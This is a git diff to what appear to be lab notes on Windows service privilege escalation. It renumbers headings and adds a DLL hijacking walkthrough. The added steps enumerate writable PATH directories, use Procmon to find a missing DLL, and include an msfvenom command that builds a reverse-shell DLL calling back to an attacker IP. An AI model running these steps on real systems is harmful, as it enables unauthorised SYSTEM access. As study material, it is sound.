@@ -251,7 +251,7 @@ Start/Stop a service:
 
 ### accesschk
 
-## Insecure Service Permission
+## 1. Insecure Service Permission
 If our user has permission to change the configuration of a
 service which runs with SYSTEM privileges, we can change
 the executable the service uses to one of our own.
@@ -323,7 +323,7 @@ SERVICE_NAME: daclsvc
 net start daclsvc
 ```
 
-## Unquoted Service Path
+## 2. Unquoted Service Path
 
 Executables in windows can be run without using their extension. For eg. whoami.exe can be run by just whoami.
 Some executables takes arguments, spearated by the spaces. eg.
@@ -367,7 +367,7 @@ net start unquotedsvc
 ```
 
 
-### Weak Registry Permission
+## 3.  Weak Registry Permission
 The Windows registry stores entries for each service.
 Since registry entries can have ACLs, if the ACL is
 misconfigured, it may be possible to modify a service’s
@@ -454,7 +454,7 @@ C:\PrivEsc\reverse.exe /f
 > net start regsvc
 ```
 
-## Insecure Service Executables
+## 4. Insecure Service Executables
 
 If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system
 
@@ -472,6 +472,33 @@ Copy the reverse shell executable to overwrite the service executable:
 5. Start a listener on Kali, and then start the service to trigger the exploit:
 > net start filepermsvc
 ```
+
+### 5. DLL Hijacking
+A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual.
+```bash
+Use winPEAS to enumerate non-Windows services:
+> .\winPEASany.exe quiet servicesinfo
+2. Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:
+> .\accesschk.exe /accepteula -uvqc user dllsvc
+3. The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We
+can confirm this manually:
+> sc qc dllsvc
+4. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
+5. Add a new filter on the Process Name matching dllhijackservice.exe.
+6. On the main screen, deselect registry activity and network activity.
+7. Start the service:
+> net start dllsvc
+8. Back in Procmon, note that a number of “NAME NOT
+FOUND” errors appear, associated with the hijackme.dll file.
+9. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.
+10. On Kali, generate a reverse shell DLL named hijackme.dll:
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
+11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:
+> net stop dllsvc
+> net start dllsvc
+
+```
+
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
 
